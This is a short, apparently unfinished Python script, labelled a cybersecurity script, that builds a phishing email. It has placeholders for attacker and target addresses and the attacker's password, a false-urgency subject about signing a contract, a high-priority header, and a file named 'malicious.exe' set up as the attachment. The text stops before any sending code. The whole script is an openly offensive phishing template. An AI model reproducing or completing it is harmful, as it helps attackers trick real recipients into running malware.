# Cybersecurity script to send phishing email

import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

sender_email = "INPUT ATTACKER EMAIL"
receiver_email = "INPUT TARGET EMAIL"
password = "INPUT ATTACKER EMAIL PASSWORD"

message = MIMEMultipart("alternative")
message["Subject"] = "Need the contract sign ASAP."    # Subject of the email
message["From"] = sender_email
message["To"] = receiver_email

# Create the plain-text and HTML version of your message

text = "INPUT TEXT HERE"

# Put the email as urgent

message.add_header("X-Priority", "1")

# Turn these into plain/html MIMEText objects

part1 = MIMEText(text, "plain")

# Add HTML/plain-text parts to MIMEMultipart message

# The email client will try to render the last part first

message.attach(part1)

# Malicious attachment

filename = "malicious.exe"  # In same directory as script

